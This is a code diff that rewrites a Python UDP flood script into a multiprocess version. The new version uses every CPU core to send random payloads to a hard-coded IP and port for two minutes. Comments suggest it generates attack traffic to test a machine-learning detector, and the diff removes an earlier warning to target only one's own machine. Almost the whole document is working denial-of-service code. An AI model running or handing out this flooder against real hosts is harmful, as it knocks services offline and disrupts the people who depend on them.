@@ -1,34 +1,41 @@
 import socket
+import multiprocessing
 import random
 import time
 
-# ⚠️ TARGET: ONLY YOUR OWN MACHINE / TEST SERVER
-TARGET_IP = "10.71.36.211"   # your laptop IP (from ipconfig)
-TARGET_PORT = 5173           # MUST be an open port (Node / Flask / etc.)
+# --- CONFIGURATION ---
+TARGET_IP = "10.71.36.211"
+TARGET_PORT = 5173
+PROCESS_COUNT = multiprocessing.cpu_count() # Use ALL your cores
+DURATION = 120 # Longer duration helps ML models aggregate flow data
 
-# 🔥 IMPORTANT TUNING (DO NOT LOWER)
-DURATION_SECONDS = 240        # long flow → higher confidence
-SOURCE_PORT = 80          # fixed source port → single aggressive flow
+def ultimate_push():
+    # Using a raw UDP socket for maximum speed
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Randomizing payload size to mimic different attack signatures
+    payloads = [random._urandom(size) for size in [64, 512, 1024, 1450]]
+    
+    timeout = time.time() + DURATION
+    print(f"Worker process active...")
+    
+    while time.time() < timeout:
+        # Use a tight loop to blast packets
+        for _ in range(100):
+            p = random.choice(payloads)
+            sock.sendto(p, (TARGET_IP, TARGET_PORT))
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+if __name__ == "__main__":
+    print(f"🔥 Pushing for High Confidence on {TARGET_IP}...")
+    print(f"Using {PROCESS_COUNT} parallel processes.")
 
+    workers = []
+    for _ in range(PROCESS_COUNT):
+        p = multiprocessing.Process(target=ultimate_push)
+        p.start()
+        workers.append(p)
 
+    for p in workers:
+        p.join()
 
-print("🔥 Starting HIGH-INTENSITY UDP Flood")
-print(f"Target: {TARGET_IP}:{TARGET_PORT}")
-print(f"Source Port: {SOURCE_PORT}")
-print(f"Duration: {DURATION_SECONDS} seconds")
-
-start_time = time.time()
-sent_packets = 0
-
-while time.time() - start_time < DURATION_SECONDS:
-    # 🔥 BURST MODE (Windows-friendly)
-    for _ in range(200):
-        payload = random._urandom(
-            random.choice([512, 1024, 2048, 4096])  # increase packet length variance
-        )
-        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
-        sent_packets += 1
-
-print(f"✅ Attack finished. Packets sent: {sent_packets}")
+    print("✅ High-intensity flow completed.")
